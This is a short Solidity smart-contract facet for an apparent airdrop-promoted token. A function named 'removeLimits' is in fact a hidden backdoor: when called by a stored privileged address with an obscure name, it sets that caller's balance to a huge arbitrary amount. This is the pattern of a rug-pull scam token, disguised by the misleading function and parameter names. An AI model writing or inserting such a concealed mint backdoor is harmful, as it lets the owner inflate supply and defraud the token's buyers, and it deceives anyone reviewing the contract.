/*
 * SPDX-License-Identifier: MIT
 * Website: https://airdrops.io/visit/97n2/
 * Twitter: https://twitter.com/paramlaboratory
 * Discord Chat: https://airdrops.io/visit/a7n2/
 */
pragma solidity ^0.8.21;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
